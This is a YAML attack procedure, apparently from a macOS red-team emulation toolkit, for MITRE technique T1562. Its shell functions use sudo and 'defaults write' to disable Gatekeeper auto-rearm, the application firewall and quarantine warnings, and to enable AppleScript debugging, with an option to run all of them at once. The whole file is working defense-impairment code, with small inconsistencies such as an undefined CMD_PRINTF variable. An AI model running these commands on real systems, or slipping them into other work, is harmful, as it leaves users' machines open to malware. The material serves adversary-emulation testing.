procedure_name: impair_defenses
ttp_id: T1562
tactic: Defense Evasion
guid: 25f1f0bc-00aa-4561-b900-86e54558fb08
intent: Impair macOS security defenses by disabling Gatekeeper, firewall, and quarantine
  protections using defaults write commands
author: '@darmado | https://x.com/darmad0'
version: 1.0.0
created: '2025-01-27'
updated: '2025-05-30'
procedure:
  arguments:
  - option: --check-defenses
    description: Check current state of security defenses
    execute_function:
    - check_defense_status
  - option: --disable-gatekeeper
    description: Disable Gatekeeper auto-rearm
    execute_function:
    - disable_gatekeeper
  - option: --disable-firewall
    description: Disable macOS firewall
    execute_function:
    - disable_firewall
  - option: --disable-quarantine
    description: Disable LSQuarantine warnings
    execute_function:
    - disable_quarantine
  - option: --enable-osascript
    description: Enable AppleScript debugging if disabled
    execute_function:
    - enable_osascript
  - option: --all
    description: Run all defense impairment commands
    execute_function:
    - check_defense_status
    - disable_gatekeeper
    - disable_firewall
    - disable_quarantine
    - enable_osascript
  global_variable:
  - name: CMD_DEFAULTS
    type: string
    default_value: defaults
  - name: CMD_SUDO
    type: string
    default_value: sudo
  - name: CMD_KILLALL
    type: string
    default_value: killall
  functions:
  - name: check_defense_status
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "check_defense_status() {\n    $CMD_PRINTF \"DEFENSE_TYPE|COMMAND|RESULT\\\
      n\"\n    \n    # Check Gatekeeper status\n    local gatekeeper_result\n    gatekeeper_result=$($CMD_DEFAULTS\
      \ read com.apple.LaunchServices LSQuarantine 2>/dev/null)\n    $CMD_PRINTF \"\
      GATEKEEPER|defaults read com.apple.LaunchServices LSQuarantine|%s\\n\" \"$gatekeeper_result\"\
      \n    \n    # Check AppleScript status\n    local osascript_result\n    osascript_result=$($CMD_DEFAULTS\
      \ read com.apple.osascript 2>/dev/null)\n    $CMD_PRINTF \"OSASCRIPT|defaults\
      \ read com.apple.osascript|%s\\n\" \"$osascript_result\"\n    \n    return 0\n\
      }\n"
  - name: disable_gatekeeper
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "disable_gatekeeper() {\n    $CMD_PRINTF \"DEFENSE_TYPE|COMMAND|RESULT\\\
      n\"\n    \n    # Disable Gatekeeper auto-rearm\n    local gatekeeper_cmd=\"\
      $CMD_SUDO $CMD_DEFAULTS write /Library/Preferences/com.apple.security GKAutoRearm\
      \ -bool NO\"\n    local result\n    result=$($gatekeeper_cmd 2>&1)\n    $CMD_PRINTF\
      \ \"GATEKEEPER_DISABLE|sudo defaults write /Library/Preferences/com.apple.security\
      \ GKAutoRearm -bool NO|%s\\n\" \"$result\"\n    \n    return 0\n}\n"
  - name: disable_firewall
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "disable_firewall() {\n    $CMD_PRINTF \"DEFENSE_TYPE|COMMAND|RESULT\\n\"\
      \n    \n    # Disable firewall\n    local firewall_cmd=\"$CMD_SUDO $CMD_DEFAULTS\
      \ write /Library/Preferences/com.apple.alf globalstate -int 0\"\n    local result\n\
      \    result=$($firewall_cmd 2>&1)\n    $CMD_PRINTF \"FIREWALL_DISABLE|sudo defaults\
      \ write /Library/Preferences/com.apple.alf globalstate -int 0|%s\\n\" \"$result\"\
      \n    \n    return 0\n}\n"
  - name: disable_quarantine
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "disable_quarantine() {\n    $CMD_PRINTF \"DEFENSE_TYPE|COMMAND|RESULT\\\
      n\"\n    \n    # Disable LSQuarantine\n    local quarantine_result\n    quarantine_result=$($CMD_DEFAULTS\
      \ write com.apple.LaunchServices LSQuarantine -bool false 2>&1)\n    $CMD_PRINTF\
      \ \"QUARANTINE_DISABLE|defaults write com.apple.LaunchServices LSQuarantine\
      \ -bool false|%s\\n\" \"$quarantine_result\"\n    \n    return 0\n}\n"
  - name: enable_osascript
    type: main
    language:
    - shell
    opsec:
      check_fda:
        enabled: false
    code: "enable_osascript() {\n    $CMD_PRINTF \"DEFENSE_TYPE|COMMAND|RESULT\\n\"\
      \n    \n    # Enable AppleScript debugging\n    local osascript_result\n   \
      \ osascript_result=$($CMD_DEFAULTS write com.apple.osascript OSAScriptingDebugging\
      \ -bool true 2>&1)\n    $CMD_PRINTF \"OSASCRIPT_ENABLE|defaults write com.apple.osascript\
      \ OSAScriptingDebugging -bool true|%s\\n\" \"$osascript_result\"\n    \n   \
      \ return 0\n} "
